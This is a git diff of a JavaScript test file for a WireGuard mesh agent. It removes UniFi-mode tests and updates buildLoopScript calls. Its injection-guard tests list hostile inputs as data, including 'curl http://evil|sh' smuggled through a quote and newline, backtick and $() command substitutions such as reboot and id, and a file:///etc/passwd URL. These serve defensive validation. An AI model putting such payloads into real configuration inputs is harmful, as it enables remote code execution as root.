@@ -13,7 +13,6 @@ const {
 	_computeHubPeerAllowedIPs,
 	_collectSiteNetworks,
 	_computeOtherSiteNets,
-	sanitizeUnifiFields,
 	sanitizeAgentMode,
 	sanitizeWgInterface,
 	sanitizeAgentServices,
@@ -434,51 +433,18 @@ test("_computeOtherSiteNets allowed_sites ignores client links", () => {
 	assert.deepEqual(viaSite.nets, ["192.168.11.0/24"]);
 });
 
-// ─── sanitizeUnifiFields (config.env injection guard) ─────────────────────────
-
-test("sanitizeUnifiFields accepts clean values and a valid URL", () => {
-	const patch = {};
-	sanitizeUnifiFields(
-		{ unifi_url: "https://unifi.local:8443", unifi_user: "admin", unifi_pass: "s3cret-pw", unifi_site: "default" },
-		patch,
-	);
-	assert.deepEqual(patch, {
-		unifi_url: "https://unifi.local:8443",
-		unifi_user: "admin",
-		unifi_pass: "s3cret-pw",
-		unifi_site: "default",
-	});
-});
-
-test("sanitizeUnifiFields rejects config.env injection in pass/user (quote/newline/$/backtick)", () => {
-	for (const bad of ['p@ss"\nPRIMARY_URL="http://evil', "a`reboot`", "x$(id)", "back\\slash", "line\rbreak"]) {
-		assert.throws(
-			() => sanitizeUnifiFields({ unifi_pass: bad }, {}),
-			/not allowed in config\.env/,
-			`should reject ${JSON.stringify(bad)}`,
-		);
-	}
-});
-
-test("sanitizeUnifiFields rejects a non-http(s) / metacharacter unifi_url", () => {
-	assert.throws(() => sanitizeUnifiFields({ unifi_url: "file:///etc/passwd" }, {}), /valid http/);
-	assert.throws(() => sanitizeUnifiFields({ unifi_url: "https://h/$(reboot)" }, {}), /valid http/);
-});
-
 // ─── sanitizeAgentMode / sanitizeWgInterface (config.env injection guard) ─────
 
 // Regression: mode and wg_interface are interpolated into the same root-sourced
-// config.env heredoc (AGENT_MODE="..."/WG_INTERFACE="...") that sanitizeUnifiFields
-// guards. A quote+newline closes the assignment and injects arbitrary lines.
+// config.env heredoc (AGENT_MODE="..."/WG_INTERFACE="..."). A quote+newline closes the assignment and injects arbitrary lines.
 test("sanitizeAgentMode accepts whitelisted modes and defaults falsy to native", () => {
 	assert.equal(sanitizeAgentMode("native"), "native");
-	assert.equal(sanitizeAgentMode("unifi"), "unifi");
 	assert.equal(sanitizeAgentMode(undefined), "native");
 	assert.equal(sanitizeAgentMode(""), "native");
 });
 
 test("sanitizeAgentMode rejects config.env injection payloads", () => {
-	for (const bad of ['native"\ncurl http://evil|sh\n#', "native; reboot", "NATIVE", "unifi "]) {
+	for (const bad of ['native"\ncurl http://evil|sh\n#', "native; reboot", "NATIVE", "unifi"]) {
 		assert.throws(() => sanitizeAgentMode(bad), /mode must be one of/, `should reject ${JSON.stringify(bad)}`);
 	}
 });
@@ -576,7 +542,7 @@ test("getInstallScript rejects a URL that breaks out of config.env quotes", asyn
 // and /^[Peer]/ (a char class, not the header), so multi-CIDR peers got a broken
 // `wg set allowed-ips`. Must join ALL CIDRs and match a literal [Peer] header.
 test("buildLoopScript force-set producer joins all CIDRs and matches a literal [Peer] header", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	assert.ok(script.includes('$1=="[Peer]"'), "literal [Peer] header match");
 	assert.ok(script.includes("for(i=3;i<=NF;i++)ai=ai $i"), "concatenate all CIDR fields, not just $3");
 	assert.ok(!script.includes("/^[Peer]/"), "must not use the buggy regex char class");
@@ -585,7 +551,7 @@ test("buildLoopScript force-set producer joins all CIDRs and matches a literal [
 // ─── sync_routes overlap guard (Fix #7) ──────────────────────────────────────
 
 test("buildLoopScript installs a real CIDR overlap guard (not exact-match only)", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	assert.ok(script.includes("_net_overlaps"), "must define/use the overlap helper");
 	assert.ok(
 		script.includes("ipaddress.ip_network") && script.includes(".overlaps("),
@@ -598,20 +564,8 @@ test("buildLoopScript installs a real CIDR overlap guard (not exact-match only)"
 // fallback would feed wg-quick directives to `wg syncconf` and fail (peer removal
 // included) on agents whose wireguard-tools lacks `wg-quick strip`.
 test("buildLoopScript native syncconf fallback strips wg-quick keys with spaced '='", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	assert.ok(script.includes("PreDown)[[:space:]]*="), "grep fallback must allow whitespace before '='");
-});
-
-// Regression (Gap #7): the UniFi apply path only ever ADDED firewall rules. A net
-// removed from allowed_ips must also drop its FG-WG-* accept rule, mirroring the
-// native sync_routes stale-route reconciler.
-test("buildLoopScript unifi prunes stale FG-WG firewall rules on removal", () => {
-	const script = buildLoopScript("unifi");
-	assert.ok(
-		script.includes("Removed stale FloppyGuard firewall rule"),
-		"unifi apply must delete stale firewall rules",
-	);
-	assert.ok(script.includes("name[6:] not in keep"), "must keep only rules whose net is still in allowed_ips");
 });
 
 // ─── _computeHubPeerAllowedIPs ───────────────────────────────────────────────
@@ -693,7 +647,7 @@ test("sanitizeHubUrl rejects shell/sed metacharacters (config.env injection guar
 // ─── buildLoopScript: hub-URL propagation + register-retry ───────────────────
 
 test("buildLoopScript adopts server-advertised hub URLs", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	assert.match(script, /update_server_urls\(\)/);
 	assert.match(script, /get\('primary_url'\)/);
 	assert.match(script, /get\('fallback_url'\)/);
@@ -703,7 +657,7 @@ test("buildLoopScript adopts server-advertised hub URLs", () => {
 });
 
 test("buildLoopScript retries registration when /config rejects a reg_token", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	assert.match(script, /api\/agent\/register/);
 	assert.match(script, /reg_token/);
 	assert.match(script, /Recovered registration on poll/);
@@ -752,14 +706,14 @@ test("sanitizeAclNetworks treats empty array as null (no restriction = full mesh
 });
 
 test("buildLoopScript rate-limits the register-retry (no per-poll /register hammering)", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	assert.match(script, /LAST_REG_ATTEMPT=/);
 	assert.match(script, /REGISTER_RETRY_INTERVAL=/);
 	assert.match(script, /NOW - LAST_REG_ATTEMPT.*-ge.*REGISTER_RETRY_INTERVAL/);
 });
 
 test("buildLoopScript verifies a hub URL is reachable before adopting it, and upserts", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	// reach-check guards adoption so a typo'd hub URL can't brick the agent
 	assert.match(script, /\[ "\$new_primary" != "\$PRIMARY_URL" \] && reach "\$new_primary"/);
 	assert.match(script, /reach "\$new_fallback"/);
@@ -774,7 +728,7 @@ test("buildLoopScript verifies a hub URL is reachable before adopting it, and up
 // of removed networks were never cleaned up (routes were fine — sync_routes uses
 // $iface). See CHANGELOG 1.3.17.
 test("buildLoopScript substitutes %i -> $iface before eval'ing PostUp/PostDown", () => {
-	const script = buildLoopScript("native");
+	const script = buildLoopScript();
 	assert.ok(script.includes('sed "s/%i/$iface/g"'), "apply_config must replace %i with $iface before eval");
 	// Guard against regressing to a bare eval of the raw rule strings.
 	assert.ok(!/eval "\$old_postdown" 2>/.test(script), "must not eval old_postdown with literal %i");
